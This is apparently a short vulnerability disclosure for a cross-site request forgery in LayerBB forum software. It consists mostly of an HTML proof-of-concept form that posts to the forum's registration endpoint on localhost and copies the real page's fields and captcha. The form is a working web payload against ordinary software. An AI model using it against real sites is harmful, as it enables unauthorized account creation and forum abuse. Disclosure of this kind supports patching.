# Register Account CSRF
Allows for an account to be created through CSRF.

## PoC:
```html
<link href="http://localhost/public/themes/Sand/assets/css/sand.css" rel="stylesheet">

<form action="http://localhost/members.php/cmd/register" method="POST" style="padding: 25px;">
    <label for="username">Username</label>
    <input type="text" name="username" value="" id="username" class="form-control">
    <label for="password">Password</label>
    <input type="password" name="password" id="password" class="form-control">
    <label for="a_password">Confirm Password</label>
    <input type="password" name="a_password" id="a_password" class="form-control">
    <label for="email">Email</label>
    <input type="text" name="email" value="" id="email" class="form-control">
    <label for="LayerBB_captcha">Are you a bot?</label><br>
    <img src="http://localhost/public/img/captcha.php" alt="LayerBB Captcha"><br><input type="text" id="LayerBB_captcha" name="LayerBB_captcha">
    <br><br>
    <input type="submit" name="register" value="Register" class="btn btn-default">
    By clicking "Register", you agree to abide by the forum rules located <a href="http://localhost/members.php/cmd/rules">here</a>.
</form>
```
